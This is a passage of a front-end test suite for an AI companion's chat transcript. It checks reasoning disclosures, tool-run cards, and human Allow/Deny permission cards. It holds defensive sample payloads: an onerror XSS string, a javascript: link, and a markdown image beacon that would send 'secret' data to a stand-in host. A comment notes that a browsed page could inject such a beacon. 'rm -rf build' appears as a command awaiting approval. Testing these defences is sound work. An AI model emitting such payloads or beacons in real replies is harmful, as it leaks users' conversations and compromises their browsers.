// @vitest-environment happy-dom
/* oxlint-disable anti-slop/require-safety-comment-for-type-assertion, anti-slop/no-chained-type-assertions, anti-slop/no-module-mocking, anti-slop/no-unsafe-dictionary-type -- Existing tests predate the incremental anti-slop gate. */

import React, { act } from "react";
import { createRoot, type Root } from "react-dom/client";
import type {
  Companion,
  CompanionDecision,
  CompanionThread as Thread,
  CompanionToolRun,
  CompanionTranscriptEntry,
} from "@companion/contracts";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";

/**
 * Product promise:
 * A Companion turn is one message with everything the turn did inside it: the reply, the reasoning
 * behind it, the tool runs it performed, and the permission cards it is blocked on. A reader can
 * unfold any of them, and an Owner or Editor can decide a card without leaving the conversation.
 *
 * Regression caught:
 * THE-364 rebuilt this thread on assistant-ui message parts. The cards moved from hand-rolled
 * `system`-role messages into tool parts, which is where a decision could quietly stop reaching the
 * control plane, a Viewer could quietly be handed controls, and a run's disclosed detail could
 * quietly stop opening.
 *
 * Why this test renders:
 * The interactions are the promise. Reasoning and tool detail are disclosures — closed until asked
 * for — and Allow/Deny is a request, so nothing here can be observed in static markup.
 */

const decide = vi.fn(async (): Promise<Thread> => nextThread);
vi.mock("../../lib/companions", async (importOriginal) => ({
  ...(await importOriginal<typeof import("../../lib/companions")>()),
  decideCompanionDecision: (...args: unknown[]) => decide(...(args as [])),
}));

const { CompanionTranscript } = await import("./CompanionTranscript");

(globalThis as { IS_REACT_ACT_ENVIRONMENT?: boolean }).IS_REACT_ACT_ENVIRONMENT = true;

const companionId = "11111111-1111-4111-8111-111111111111";

const companion: Companion = {
  id: companionId,
  name: "Luna",
  persona: "Content marketing assistant",
  model_id: "claude-opus-4-8",
  selected_skill_ids: [],
  can_write_skills: false,
  selected_mcp_account_ids: [],
  owner_id: "user-1",
  access: "owner",
  pinned: false,
  hidden: false,
  unread: false,
  last_message: null,
  runtime: {
    generation: 1,
    state: "running",
    daemon_state: "running",
    replying: false,
    box_id: "bx_23456789",
    provider_ids: ["anthropic"],
    provider_credential_generation: null,
    disk_layout_version: 2,
    desktop_available: false,
    last_error: null,
    skills_revision: 1,
    skills_applied_revision: 1,
    skills_applied_at: null,
    skills_last_error: null,
    last_observed_at: null,
    last_started_at: null,
    last_stopped_at: null,
    lifecycle_intent: "prepare",
  },
  created_at: "2026-08-12T12:00:00.000Z",
  updated_at: "2026-08-12T12:00:00.000Z",
};

function thread(entries: CompanionTranscriptEntry[], overrides: Partial<Thread> = {}): Thread {
  return {
    companion_id: companionId,
    viewer_id: "user-1",
    access: "owner",
    read_only: false,
    can_send: true,
    entries,
    last_message_at: null,
    last_read_ordinal: null,
    ...overrides,
    active_turn: overrides.active_turn ?? null,
    queued_count: overrides.queued_count ?? 0,
    interrupted_turn: overrides.interrupted_turn ?? null,
  };
}

function activeTurn(): NonNullable<Thread["active_turn"]> {
  const now = "2026-08-12T12:01:00.000Z";
  return {
    id: "22222222-2222-4222-8222-222222222222",
    companion_id: companionId,
    client_message_id: "33333333-3333-4333-8333-333333333333",
    status: "running",
    queue_sequence: 1,
    admission_state: "accepted",
    admitted_at: now,
    replying: true,
    error: null,
    state_changed_at: now,
    settled_at: null,
    created_at: now,
    updated_at: now,
  };
}

const nextThread = thread([]);

function entry(overrides: Partial<CompanionTranscriptEntry>): CompanionTranscriptEntry {
  return {
    event_id: "pi:0",
    ordinal: 0,
    role: "assistant",
    content: "",
    reasoning: null,
    routine: null,
    trigger: null,
    turn_id: null,
    queued: false,
    author_id: null,
    author_name: null,
    tool: null,
    decision: null,
    attachments: [],
    created_at: "2026-08-12T12:01:00.000Z",
    ...overrides,
  };
}

function run(overrides: Partial<CompanionToolRun> = {}): CompanionToolRun {
  return {
    call_id: "call_1",
    kind: "shell",
    name: "bash",
    title: "ls -la",
    status: "ok",
    detail: null,
    screenshot: null,
    ...overrides,
  };
}

function card(overrides: Partial<CompanionDecision> = {}): CompanionDecision {
  return {
    request_id: "ui-1",
    kind: "shell",
    name: "bash",
    title: "rm -rf build",
    detail: null,
    status: "pending",
    answer: null,
    decided_by_id: null,
    decided_by_name: null,
    decided_at: null,
    expires_at: "2026-08-12T12:10:00.000Z",
    proposal: null,
    ...overrides,
  };
}

const roots: Root[] = [];

/** Every thread the component handed back, so the decided-card refresh can be observed. */
let threads: Thread[] = [];

function mount(
  value: Thread,
  catalog?: {
    skills?: Array<{ id: string; label: string }>;
    plugins?: Array<{ id: string; label: string }>;
    models?: Array<{ id: string; label: string }>;
  },
  onSend: (content: string, id: string, files: readonly File[]) => Promise<boolean>
    = async () => true,
  extras: {
    onStop?: (turnId: string) => Promise<void>;
    onCancelQueued?: (turnId: string) => Promise<void>;
    onOpenRoutineRun?: (routine: NonNullable<CompanionTranscriptEntry["routine"]>) => void;
  } = {},
) {
  const container = document.createElement("div");
  document.body.appendChild(container);
  const root = createRoot(container);
  roots.push(root);
  act(() => {
    root.render(React.createElement(CompanionTranscript, {
      companion,
      thread: value,
      orgId: "org-1",
      busy: false,
      skills: catalog?.skills,
      plugins: catalog?.plugins,
      models: catalog?.models,
      onSend,
      onStop: extras.onStop,
      onCancelQueued: extras.onCancelQueued,
      onOpenRoutineRun: extras.onOpenRoutineRun,
      onThread: (next: Thread) => threads.push(next),
    }));
  });
  return container;
}

/**
 * Poll again with a newer thread, into the same React root.
 *
 * This transcript is keyed by Companion, so it stays mounted for the whole conversation: a card that
 * was running is the same card once it is done, and a test that mounts twice proves two first
 * renders rather than the update a reader actually sees.
 *
 * The second `act` is what makes it a poll rather than a re-render. The message store publishes
 * through a scheduler that flushes on a macrotask, so awaiting microtasks is not enough — the event
 * loop has to turn, which between two real polls it does many times over.
 */
async function repoll(value: Thread) {
  await act(async () => {
    roots.at(-1)!.render(React.createElement(CompanionTranscript, {
      companion,
      thread: value,
      orgId: "org-1",
      busy: false,
      onSend: async () => true,
      onThread: (next: Thread) => threads.push(next),
    }));
  });
  await act(async () => {
    await new Promise((resolve) => setTimeout(resolve, 0));
  });
}

/** One attachment as the thread projection carries it. */
function attachment(overrides: Record<string, unknown> = {}) {
  return {
    id: "7c1f0b52-8a2e-4c3d-9f10-0b1c2d3e4f50",
    kind: "user_upload" as const,
    content_type: "image/png" as const,
    byte_size: 2048,
    filename: "chart.png",
    position: 0,
    availability: "available" as const,
    expires_at: "2026-09-11T12:00:00.000Z",
    ...overrides,
  };
}

function fileList(files: File[]): FileList {
  return Object.assign(files, {
    item: (index: number) => files[index] ?? null,
  }) as unknown as FileList;
}

function buttonNamed(container: HTMLElement, name: string): HTMLButtonElement | undefined {
  return [...container.querySelectorAll("button")]
    .find((button) => (button.textContent ?? "").trim() === name);
}

function click(target: Element) {
  act(() => {
    target.dispatchEvent(new MouseEvent("click", { bubbles: true, cancelable: true }));
  });
}

beforeEach(() => {
  decide.mockClear();
  decide.mockImplementation(async () => nextThread);
  threads = [];
});

afterEach(() => {
  act(() => roots.splice(0).forEach((root) => root.unmount()));
  document.body.innerHTML = "";
});

describe("a Companion turn's reasoning", () => {
  it("stays folded away until a reader asks for it", () => {
    const container = mount(thread([
      entry({ content: "Two services timed out.", reasoning: "I read the incident log first." }),
    ]));
    const trigger = container.querySelector("[data-slot='reasoning-trigger']") as HTMLElement;

    // The reply is the answer; the thinking behind it is disclosure and starts closed.
    expect(trigger.getAttribute("data-state")).toBe("closed");
    expect(container.textContent).toContain("Two services timed out.");

    click(trigger);

    expect(trigger.getAttribute("data-state")).toBe("open");
    expect(container.textContent).toContain("I read the incident log first.");
  });

  it("is offered only by a turn that produced any", () => {
    const container = mount(thread([entry({ content: "2025" })]));

    expect(container.querySelector("[data-slot='reasoning-trigger']")).toBeNull();
  });
});

describe("a Companion reply as markdown", () => {
  it("renders the structure Pi wrote", () => {
    const container = mount(thread([
      entry({ content: "## Incident\n\n- one\n- two\n\n```bash\nls -la\n```" }),
    ]));

    expect(container.querySelector("h2")?.textContent).toBe("Incident");
    expect(container.querySelectorAll("li")).toHaveLength(2);
    expect(container.querySelector("pre code")?.textContent).toContain("ls -la");
  });

  it("keeps markup a model wrote as text instead of as elements", () => {
    // A reply is model output, and a model can be told what to say by a page it browsed. Raw HTML
    // must never become part of this document.
    const container = mount(thread([
      entry({ content: "<img src=x onerror=alert(1)> and <b>bold</b>" }),
    ]));

    expect(container.querySelector("img")).toBeNull();
    expect(container.querySelector("b")).toBeNull();
    expect(container.textContent).toContain("<img src=x onerror=alert(1)>");
  });

  it("never fetches an image a reply asked for", () => {
    // `![](https://elsewhere/?d=…)` would send the conversation to whoever wrote it, with no click
    // and no way for the reader to know. The description stands in for the image instead.
    const container = mount(thread([
      entry({ content: "![the leak](https://example.invalid/beacon?d=secret)" }),
    ]));

    expect(container.querySelector("img")).toBeNull();
    expect(container.innerHTML).not.toContain("example.invalid");
    expect(container.textContent).toContain("[image: the leak]");
  });

  it("refuses a javascript: link", () => {
    const container = mount(thread([entry({ content: "[click](javascript:alert(1))" })]));

    expect(container.querySelector("a")?.getAttribute("href") ?? "").not.toContain("javascript:");
  });

  it("offers allowlisted Conductor deep links to the current browsing context", () => {
    const container = mount(thread([
      entry({ content: "[Open workspace](conductor://workspace?id=workspace-1)" }),
    ]));
    const link = container.querySelector("a");

    expect(link?.getAttribute("href")).toBe("conductor://workspace?id=workspace-1");
    expect(link?.getAttribute("target")).toBeNull();
    expect(link?.classList.contains("aui-md-deep-link")).toBe(true);
  });

  it("leaves a plain-text Conductor URL as text", () => {
    const container = mount(thread([
      entry({ content: "Open conductor://workspace?id=workspace-1" }),
    ]));

    expect(container.querySelector("a")).toBeNull();
    expect(container.textContent).toContain("conductor://workspace?id=workspace-1");
  });

  it("keeps web links isolated and refuses other custom schemes", () => {
    const container = mount(thread([
      entry({ content: "[Docs](https://example.com) [unsafe](other-app://open)" }),
    ]));
    const links = [...container.querySelectorAll("a")];

    expect(links[0]?.getAttribute("href")).toBe("https://example.com");
    expect(links[0]?.getAttribute("target")).toBe("_blank");
    expect(links[1]?.getAttribute("href") ?? "").not.toContain("other-app:");
  });
});

describe("a tool run in the thread", () => {
  it("reports what ran and how it ended without unfolding anything", () => {
    const container = mount(thread([
      entry({ role: "tool", content: "ls -la", tool: run({ detail: "total 8\n" }) }),
    ]));
    const runCard = container.querySelector("[data-slot='companion-tool-run']") as HTMLElement;

    expect(runCard.textContent).toContain("bash");
    expect(runCard.textContent).toContain("ls -la");
    // The status is never left to the tick alone, but for an ordinary run it stays for the reader
    // who cannot see the tick rather than taking a place on the line.
    expect(runCard.textContent).toContain("done");
    expect(runCard.querySelector(".sr-only")?.textContent).toBe("done");
    expect(runCard.textContent).not.toContain("total 8");
  });

  it("unfolds the arguments and the result when asked", () => {
    const container = mount(thread([
      entry({ role: "tool", content: "ls -la", tool: run({ detail: "total 8\n" }) }),
    ]));
    const trigger = container.querySelector(
      "[data-slot='companion-tool-run'] [data-slot='collapsible-trigger']",
    ) as HTMLButtonElement;

    click(trigger);

    expect(container.textContent).toContain("total 8");
  });

  it("has nothing to unfold when Pi reported nothing about the run", () => {
    const container = mount(thread([entry({ role: "tool", content: "ls -la", tool: run() })]));
    const trigger = container.querySelector(
      "[data-slot='companion-tool-run'] [data-slot='collapsible-trigger']",
    ) as HTMLButtonElement;

    expect(trigger.disabled).toBe(true);
  });

  it("names the agent a turn delegated to, and says where it has got to", () => {
    const delegated = (overrides: Partial<CompanionToolRun>) => run({
      kind: "subagent",
      name: "subagent",
      title: "researcher: read the changelog",
      ...overrides,
    });
    const delegatedThread = (tool: CompanionToolRun) => thread([
      entry({ role: "tool", content: "researcher: read the changelog", tool }),
    ]);
    const container = mount(
      delegatedThread(delegated({ status: "running", detail: "reading CHANGELOG.md" })),
    );
    const card = () =>
      container.querySelector("[data-slot='companion-tool-run']") as HTMLElement;

    expect(card().textContent).toContain("subagent");
    expect(card().textContent).toContain("researcher: read the changelog");
    // A run that can last minutes says where it is in words, not only as a spinner.
    expect(card().getAttribute("aria-busy")).toBe("true");
    expect(card().querySelector(".sr-only")).toBeNull();
    expect(card().textContent).toContain("running");
    // The line is one line, so the headline it cannot fit stays reachable rather than lost: it is
    // the only copy of the task once progress replaces the detail.
    expect(container.querySelector("[title='researcher: read the changelog']")).not.toBeNull();

    // What it did is a disclosure, exactly like every other run's.
    expect(card().textContent).not.toContain("reading CHANGELOG.md");
    click(container.querySelector(
      "[data-slot='companion-tool-run'] [data-slot='collapsible-trigger']",
    ) as HTMLButtonElement);
    expect(container.textContent).toContain("reading CHANGELOG.md");
  });

  it("says in a word how a delegated run ended", () => {
    for (const [status, word] of [["ok", "done"], ["error", "failed"]] as const) {
      const container = mount(thread([
        entry({
          role: "tool",
          content: "researcher: read the changelog",
          tool: run({
            kind: "subagent",
            name: "subagent",
            title: "researcher: read the changelog",
            status,
            detail: "read 240 lines",
          }),
        }),
      ]));
      const settled = container.querySelector("[data-slot='companion-tool-run']") as HTMLElement;

      expect(settled.querySelector(".sr-only")).toBeNull();
      expect(settled.textContent).toContain(word);
      expect(settled.getAttribute("aria-busy")).toBeNull();
    }
  });

  it("settles a run in place, without the thread being reopened", async () => {
    // The transcript is keyed by Companion and never remounts on a poll, so a card that cannot
    // follow its own run would spin for the rest of the conversation. Asserted on a shell run
    // because that path predates delegated runs: this is the thread's behaviour, not one kind's.
    const shellThread = (status: CompanionToolRun["status"], detail: string) => thread([
      entry({ role: "tool", content: "ls -la", tool: run({ status, detail }) }),
    ]);
    const container = mount(shellThread("running", "reading"));
    const card = () =>
      container.querySelector("[data-slot='companion-tool-run']") as HTMLElement;

    expect(card().getAttribute("aria-busy")).toBe("true");

    await repoll(shellThread("ok", "total 8"));

    expect(card().getAttribute("aria-busy")).toBeNull();
    click(container.querySelector(
      "[data-slot='companion-tool-run'] [data-slot='collapsible-trigger']",
    ) as HTMLButtonElement);
    expect(container.textContent).toContain("total 8");
  });

  it("follows a delegated run from its task through progress to how it ended", async () => {
    const delegated = (status: CompanionToolRun["status"], detail: string) => thread([
      entry({
        role: "tool",
        content: "researcher: read the changelog",
        tool: run({
          kind: "subagent",
          name: "subagent",
          title: "researcher: read the changelog",
          status,
          detail,
        }),
      }),
    ]);
    const container = mount(delegated("running", "read the changelog"));
    const card = () =>
      container.querySelector("[data-slot='companion-tool-run']") as HTMLElement;

    // Progress replaces the task in the disclosure while the run is still going.
    await repoll(delegated("running", "reading CHANGELOG.md"));

    expect(card().getAttribute("aria-busy")).toBe("true");
    click(container.querySelector(
      "[data-slot='companion-tool-run'] [data-slot='collapsible-trigger']",
    ) as HTMLButtonElement);
    expect(container.textContent).toContain("reading CHANGELOG.md");

    await repoll(delegated("ok", "read 240 lines"));

    // The headline is still the task; only the outcome and the progress moved.
    expect(card().textContent).toContain("researcher: read the changelog");
    expect(card().textContent).toContain("done");
    expect(card().getAttribute("aria-busy")).toBeNull();
    expect(container.textContent).toContain("read 240 lines");
  });

  it("renders a card for a kind this bundle has never heard of", () => {
    // A thread outlives the tab that renders it, and the kind catalog grows. An unknown kind used
    // to be an unguarded icon lookup, which React renders as a thrown error — taking the whole
    // conversation with it, not just the card.
    const container = mount(thread([
      entry({
        role: "tool",
        content: "future tool",
        tool: { ...run(), kind: "hologram" as CompanionToolRun["kind"], name: "hologram" },
      }),
    ]));

    expect(container.querySelector("[data-slot='companion-tool-run']")?.textContent)
      .toContain("hologram");
  });

  it("shows the Box desktop as the run left it", () => {
    const screenshot = "data:image/png;base64,iVBORw0KGgo=";
    const container = mount(thread([
      entry({ role: "tool", content: "click", tool: run({ kind: "computer", screenshot }) }),
    ]));
    const frame = container.querySelector("img") as HTMLImageElement;

    expect(frame.getAttribute("src")).toBe(screenshot);
    expect(frame.getAttribute("alt")).toContain("The Box desktop after");
  });

  it("keeps a run that is still open marked as busy", () => {
    const container = mount(thread([
      entry({ role: "tool", content: "ls -la", tool: run({ status: "running" }) }),
    ]));
    const runCard = container.querySelector("[data-slot='companion-tool-run']") as HTMLElement;

    expect(runCard.getAttribute("aria-busy")).toBe("true");
    expect(runCard.textContent).toContain("running");
  });

  it("settles a timed-out run so the thread is no longer busy", () => {
    const container = mount(thread([
      entry({
        role: "tool",
        content: "/tmp/conductor-cli.png",
        tool: run({
          name: "read",
          title: "/tmp/conductor-cli.png",
          status: "timeout",
          detail: "Timed out after 90 seconds without a tool result.",
        }),
      }),
    ]));
    const runCard = container.querySelector("[data-slot='companion-tool-run']") as HTMLElement;
    const composer = container.querySelector("textarea[aria-label='Message Luna']") as HTMLTextAreaElement;
    const send = container.querySelector("button[aria-label='Send message']") as HTMLButtonElement;
    const setter = Object.getOwnPropertyDescriptor(window.HTMLTextAreaElement.prototype, "value")?.set;
    act(() => {
      setter?.call(composer, "Alors ?");
      composer.dispatchEvent(new Event("input", { bubbles: true }));
    });

    expect(runCard.getAttribute("aria-busy")).toBeNull();
    expect(runCard.textContent).toContain("timed out");
    expect(container.textContent).not.toContain("Luna is replying...");
    expect(send.disabled).toBe(false);
  });

  it("does not show a reply in flight for user messages re-queued after a timed-out run", () => {
    const container = mount(thread([
      entry({
        event_id: "pi:read",
        ordinal: 1,
        role: "tool",
        content: "/tmp/conductor-cli.png",
        tool: run({
          name: "read",
          title: "/tmp/conductor-cli.png",
          status: "timeout",
          detail: "Timed out after 90 seconds without a tool result.",
        }),
      }),
      entry({ event_id: "msg:2", ordinal: 2, role: "user", content: "Alors ?" }),
      entry({ event_id: "msg:3", ordinal: 3, role: "user", content: "Ca va ?" }),
      entry({ event_id: "msg:4", ordinal: 4, role: "user", content: "ping THE-369" }),
    ]));

    expect(container.textContent).not.toContain("Luna is replying...");
  });
});

describe("a permission card in the thread", () => {
  it("sends an Owner's Allow to the control plane", async () => {
    const container = mount(thread([
      entry({ role: "decision", event_id: "decision:ui-1", content: "rm -rf build", decision: card() }),
    ]));

    const allow = buttonNamed(container, "Allow");
    expect(allow).toBeDefined();
    await act(async () => {
      allow!.dispatchEvent(new MouseEvent("click", { bubbles: true, cancelable: true }));
    });

    expect(decide).toHaveBeenCalledWith("org-1", companionId, "ui-1", { action: "allow" });
    // The thread the control plane answered with goes straight back to the surface, so the card
    // leaves `pending` on the spot rather than at the next poll.
    expect(threads).toEqual([nextThread]);
  });

  it("sends one decision even when Allow is pressed twice before it settles", async () => {
    // This is the control that unblocks a shell command inside the Box. Pressing it twice must not
    // ask twice.
    let settle: (thread: Thread) => void = () => {};
    decide.mockImplementation(() => new Promise<Thread>((resolve) => { settle = resolve; }));
    const container = mount(thread([
      entry({ role: "decision", event_id: "decision:ui-1", content: "rm -rf build", decision: card() }),
    ]));
    const allow = buttonNamed(container, "Allow")!;

    click(allow);
    click(allow);
    await act(async () => {
      settle(nextThread);
    });

    expect(decide).toHaveBeenCalledTimes(1);
  });

  it("sends a Deny the same way", async () => {
    const container = mount(thread([
      entry({ role: "decision", event_id: "decision:ui-1", content: "rm -rf build", decision: card() }),
    ]));

    await act(async () => {
      buttonNamed(container, "Deny")!
        .dispatchEvent(new MouseEvent("click", { bubbles: true, cancelable: true }));
    });

    expect(decide).toHaveBeenCalledWith("org-1", companionId, "ui-1", { action: "deny" });
  });

  it("answers a question with what was typed, and refuses an empty answer", async () => {
    const container = mount(thread([
      entry({
        role: "decision",
        event_id: "decision:ui-q",
        content: "Which environment?",
        decision: card({ request_id: "ui-q", kind: "question", name: "ask_user" }),
      }),
    ]));
    const field = container.querySelector("input[aria-label='Answer']") as HTMLInputElement;
    const form = container.querySelector("form") as HTMLFormElement;

    // Nothing typed is nothing to send: the card must not resolve on an empty submit.
    await act(async () => {
      form.dispatchEvent(new Event("submit", { bubbles: true, cancelable: true }));
    });
    expect(decide).not.toHaveBeenCalled();

    const setter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, "value")?.set;
    act(() => {
      setter?.call(field, "staging");
      field.dispatchEvent(new Event("input", { bubbles: true }));
    });
    await act(async () => {
      form.dispatchEvent(new Event("submit", { bubbles: true, cancelable: true }));
    });

    expect(decide).toHaveBeenCalledWith("org-1", companionId, "ui-q", {
      action: "answer",
      answer: "staging",
    });
  });

  it("keeps a decided card on the transcript with who decided it, and no controls", () => {
    const container = mount(thread([
      entry({
        role: "decision",
        event_id: "decision:ui-1",
        content: "rm -rf build",
        decision: card({ status: "denied", decided_by_id: "user-2", decided_by_name: "Ada" }),
      }),
    ]));

    expect(container.textContent).toContain("denied by Ada");
    expect(buttonNamed(container, "Allow")).toBeUndefined();
    expect(buttonNamed(container, "Deny")).toBeUndefined();
  });

  it("reads a timed-out card as the denial it was", () => {
    const container = mount(thread([
      entry({
        role: "decision",
        event_id: "decision:ui-1",
        content: "rm -rf build",
        decision: card({ status: "expired" }),
      }),
    ]));

    expect(container.textContent).toContain("Timed out, denied");
    expect(buttonNamed(container, "Allow")).toBeUndefined();
  });

  it("shows a superseded card as closed without approval", () => {
    const container = mount(thread([
      entry({
        role: "decision",
        event_id: "decision:ui-1",
        content: "rm -rf build",
        decision: card({ status: "cancelled" }),
      }),
    ]));

    expect(container.textContent).toContain("Closed without approval");
    expect(buttonNamed(container, "Allow")).toBeUndefined();
  });

  it("tells a Viewer who the thread is waiting on instead of offering the controls", () => {
    const container = mount(thread(
      [entry({ role: "decision", event_id: "decision:ui-1", content: "rm -rf build", decision: card() })],
      { access: "viewer", read_only: true, can_send: false, viewer_id: "user-9" },
    ));

    expect(container.textContent).toContain("Waiting for an Owner or Editor");
    expect(buttonNamed(container, "Allow")).toBeUndefined();
    expect(buttonNamed(container, "Deny")).toBeUndefined();
  });

  it("attributes a config proposal to the Companion and names loaded resources", async () => {
    const skillId = "aaaaaaaa-aaaa-4aaa-8aaa-aaaaaaaaaaaa";
    const unknownId = "bbbbbbbb-bbbb-4bbb-8bbb-bbbbbbbbbbbb";
    const container = mount(
      thread([entry({
        role: "decision",
        event_id: "decision:config-1",
        content: "Add skills",
        decision: card({
          request_id: "config-1",
          kind: "config",
          name: "config",
          title: "injected title from Pi",
          proposal: {
            kind: "config",
            add_skill_ids: [skillId, unknownId],
            persona: "Keep answers short.",
          },
        }),
      })]),
      { skills: [{ id: skillId, label: "incident-summary" }] },
    );

    expect(container.textContent).toContain("Luna proposes these changes");
    expect(container.textContent).toContain("incident-summary");
    expect(container.textContent).toContain("a resource owned by another member");
    expect(container.textContent).not.toContain("injected title from Pi");
    expect(container.textContent).toContain("Persona");
    const approve = buttonNamed(container, "Approve");
    expect(approve).toBeDefined();
    await act(async () => {
      approve!.dispatchEvent(new MouseEvent("click", { bubbles: true, cancelable: true }));
    });
    expect(decide).toHaveBeenCalledWith("org-1", companionId, "config-1", { action: "allow" });
  });

  it("hides a routine prompt behind a compact header", () => {
    const container = mount(thread([
      entry({
        role: "user",
        event_id: "msg:routine-1",
        content: "Write the standup with yesterday's blockers.",
        author_id: "user-1",
        routine: { id: "aaaaaaaa-aaaa-4aaa-8aaa-aaaaaaaaaaaa", name: "Standup" },
      }),
      entry({
        role: "assistant",
        event_id: "pi:1",
        content: "Standup drafted.",
      }),
    ]));

    expect(container.querySelector(".chat-routine-header")?.textContent).toBe("Routine: Standup");
    expect(container.textContent).not.toContain("yesterday's blockers");
    expect(container.textContent).toContain("Standup drafted.");
  });

  it("expands earlier server-grouped notify updates inline", () => {
    const onOpenRoutineRun = vi.fn();
    const routine = {
      id: "aaaaaaaa-aaaa-4aaa-8aaa-aaaaaaaaaaaa",
      name: "Skills Hub",
      run_id: "bbbbbbbb-bbbb-4bbb-8bbb-bbbbbbbbbbbb",
    };
    const hiddenMarker = entry({
      role: "user",
      event_id: "msg:routine-old",
      ordinal: 1,
      content: "Private scheduled prompt",
      author_id: "user-1",
      routine: { ...routine, run_id: "cccccccc-cccc-4ccc-8ccc-cccccccccccc" },
    });
    const hiddenReply = entry({
      event_id: "routine-return:old",
      ordinal: 2,
      content: "Skills Hub: companion 1.85.0 → 1.86.0.",
    });
    const container = mount(thread([
      entry({
        ...hiddenMarker,
        event_id: "msg:routine-latest",
        ordinal: 3,
        routine,
      }),
      entry({
        event_id: "routine-return:latest",
        ordinal: 4,
        content: "Skills Hub: companion 1.86.0 → 1.88.0.",
        routine_notify_group: {
          routine_name: "Skills Hub",
          total_count: 2,
          hidden_entries: [hiddenMarker, hiddenReply],
        },
      }),
    ]), undefined, async () => true, { onOpenRoutineRun });

    const disclosure = Array.from(container.querySelectorAll<HTMLButtonElement>("button"))
      .find((button) => button.textContent?.includes("Skills Hub · 2 updates"));
    expect(disclosure?.getAttribute("aria-expanded")).toBe("false");
    expect(container.textContent).not.toContain("1.85.0");
    expect(container.textContent).toContain("1.88.0");

    click(disclosure!);

    const expandedDisclosure = Array.from(container.querySelectorAll<HTMLButtonElement>("button"))
      .find((button) => button.textContent?.includes("Skills Hub · 2 updates"));
    expect(expandedDisclosure?.getAttribute("aria-expanded")).toBe("true");
    expect(container.textContent).toContain("1.85.0");
    expect(container.textContent).not.toContain("Private scheduled prompt");

    const hiddenRun = container.querySelector<HTMLButtonElement>(
      ".chat-routine-notify-history button[aria-label='Open Skills Hub routine run']",
    );
    click(hiddenRun!);
    expect(onOpenRoutineRun).toHaveBeenCalledWith(hiddenMarker.routine);
  });

  it("opens a routine run from its durable marker without exposing the prompt", () => {
    const onOpenRoutineRun = vi.fn();
    const routine = {
      id: "aaaaaaaa-aaaa-4aaa-8aaa-aaaaaaaaaaaa",
      name: "Standup",
      run_id: "bbbbbbbb-bbbb-4bbb-8bbb-bbbbbbbbbbbb",
    };
    const container = mount(thread([entry({
      role: "user",
      event_id: "msg:routine-2",
      content: "Private scheduled prompt",
      author_id: "user-1",
      routine,
    })]), undefined, async () => true, { onOpenRoutineRun });

    const marker = container.querySelector<HTMLButtonElement>(
      "button[aria-label='Open Standup routine run']",
    );
    expect(marker?.textContent).toContain("Routine: Standup");
    expect(container.textContent).not.toContain("Private scheduled prompt");

    click(marker!);

    expect(onOpenRoutineRun).toHaveBeenCalledWith(routine);
  });

  it("attributes a routine proposal to the Companion and shows the schedule", async () => {
    const container = mount(thread([entry({
      role: "decision",
      event_id: "decision:routine-1",
      content: "Schedule Standup",
      decision: card({
        request_id: "routine-1",
        kind: "routine",
        name: "routine",
        title: "injected title from Pi",
        proposal: {
          kind: "routine",
          name: "Standup",
          prompt: "Write the standup.",
          cron: "0 9 * * 1-5",
          timezone: "America/New_York",
        },
      }),
    })]));

    expect(container.textContent).toContain("Luna proposes this routine");
    expect(container.textContent).toContain("Standup");
    expect(container.textContent).toContain("0 9 * * 1-5");
    expect(container.textContent).toContain("America/New_York");
    expect(container.textContent).not.toContain("injected title from Pi");
    const approve = buttonNamed(container, "Approve");
    expect(approve).toBeDefined();
    await act(async () => {
      approve!.dispatchEvent(new MouseEvent("click", { bubbles: true, cancelable: true }));
    });
    expect(decide).toHaveBeenCalledWith("org-1", companionId, "routine-1", { action: "allow" });
  });

  it("hides a trigger's composed prompt behind a compact header", () => {
    const container = mount(thread([
      entry({
        role: "user",
        event_id: "msg:trigger-1",
        content: "Summarize the failure.\n\n## Event payload (external, untrusted)",
        author_id: "user-1",
        trigger: { id: "aaaaaaaa-aaaa-4aaa-8aaa-aaaaaaaaaaaa", name: "CI failed" },
      }),
      entry({
        role: "assistant",
        event_id: "pi:1",
        content: "Failure summarized.",
      }),
    ]));

    expect(container.querySelector(".chat-routine-header")?.textContent).toBe("Trigger: CI failed");
    expect(container.textContent).not.toContain("Summarize the failure");
    expect(container.textContent).not.toContain("Event payload");
    expect(container.textContent).toContain("Failure summarized.");
  });

  it("attributes a trigger proposal to the Companion and notes where the URL lives", async () => {
    const container = mount(thread([entry({
      role: "decision",
      event_id: "decision:trigger-1",
      content: "Create a trigger",
      decision: card({
        request_id: "trigger-1",
        kind: "trigger",
        name: "trigger",
        title: "injected title from Pi",
        proposal: {
          kind: "trigger",
          name: "CI failed",
          prompt: "Summarize the failure.",
          mode: "notify",
          provider: "github",
        },
      }),
    })]));

    expect(container.textContent).toContain("Luna proposes this trigger");
    expect(container.textContent).toContain("CI failed");
    expect(container.textContent).toContain("github");
    expect(container.textContent).not.toContain("injected title from Pi");
    const approve = buttonNamed(container, "Approve");
    expect(approve).toBeDefined();
    await act(async () => {
      approve!.dispatchEvent(new MouseEvent("click", { bubbles: true, cancelable: true }));
    });
    expect(decide).toHaveBeenCalledWith("org-1", companionId, "trigger-1", { action: "allow" });
  });

  it("confirms an approved trigger was registered end to end", () => {
    const container = mount(thread([entry({
      role: "decision",
      event_id: "decision:trigger-2",
      content: "Create a trigger",
      decision: card({
        request_id: "trigger-2",
        kind: "trigger",
        name: "trigger",
        title: "Create a trigger",
        status: "allowed",
        decided_by_id: "user-1",
        decided_by_name: "Ada",
        proposal: {
          kind: "trigger",
          name: "CI failed",
          prompt: "Summarize the failure.",
          mode: "notify",
          provider: "github",
        },
      }),
    })]));

    expect(container.textContent).toContain("Approved — Companion handled the provider setup.");
    expect(container.textContent).not.toContain("Copy the webhook URL");
  });

  it("keeps a config card pending and shows the error when approval fails", async () => {
    decide.mockRejectedValueOnce(new Error("selected Companion Skill is unavailable"));
    const container = mount(thread([entry({
      role: "decision",
      event_id: "decision:config-2",
      content: "Add a skill",
      decision: card({
        request_id: "config-2",
        kind: "config",
        name: "config",
        title: "Add a skill",
        proposal: {
          kind: "config",
          add_skill_ids: ["aaaaaaaa-aaaa-4aaa-8aaa-aaaaaaaaaaaa"],
        },
      }),
    })]));

    await act(async () => {
      buttonNamed(container, "Approve")!
        .dispatchEvent(new MouseEvent("click", { bubbles: true, cancelable: true }));
    });

    expect(container.textContent).toContain("selected Companion Skill is unavailable");
    expect(buttonNamed(container, "Approve")).toBeDefined();
    expect(threads).toEqual([]);
  });

  it("sends a plugin connection request to Plugins instead of applying settings", () => {
    const container = mount(thread([entry({
      role: "decision",
      event_id: "decision:config-3",
      content: "Connect GitHub",
